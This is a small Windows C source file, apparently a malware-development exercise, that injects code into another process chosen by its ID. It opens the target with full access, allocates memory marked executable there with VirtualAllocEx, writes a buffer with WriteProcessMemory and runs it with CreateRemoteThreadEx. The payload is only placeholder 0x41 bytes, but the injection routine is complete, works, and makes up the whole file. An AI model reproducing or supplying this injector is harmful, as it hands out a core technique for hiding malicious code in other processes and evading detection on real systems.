#include <windows.h>
#include <stdio.h>

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";

DWORD PID = NULL;
HANDLE hProcess = NULL;
HANDLE hThread = NULL;
LPVOID rBuffer = NULL;
DWORD TID = NULL;
unsigned char Puke[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41";

int main(int argc, char* argv[]) {
	//checking if the arugment count into this program is less then two
	if (argc < 2) {
		printf("%s usage remotecodeinjection.exe <PID>", e);
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	printf("%s trying to open a handle to process (%ld)\n", i, PID);
	/* Open a Handle to a process and store it in hProcess */
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	printf("%s got a handle to the process --0x%p", k, hProcess);


	if (hProcess == NULL) {
		//%ld is used to print DWORDS, %s is for strings. 
		printf("%s failed to get the HANDLE for the process using OpenProcess() (%ld), error: %ld", e, PID, GetLastError());
		return EXIT_FAILURE;
	}
	/* Allocate bytes to process memory */
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(Puke), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("%s got allocated bytes %zu-bytes with PAGE_EXECUTE_READWRITE permissons", k, sizeof(Puke));



	/* Actually write that allocated memory to the process memory */
	WriteProcessMemory(hProcess, rBuffer, Puke, sizeof(Puke), NULL);
	printf("%s written memory %zu-bytes with PAGE_EXECUTE_READWRITE permissons", k, sizeof(Puke));


	/* Create thread to run our payload*/
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);



	if (hThread == NULL) {
		printf("%s failed to get a handle to the thread, error %ld", e, GetLastError());
			CloseHandle(hProcess);
			return EXIT_FAILURE;
	}

	printf("%s got a handle to the thread (%ld) ---0x%p", k, TID, hThread);


	CloseHandle(hThread);
	CloseHandle(hProcess);
	return EXIT_SUCCESS;


};
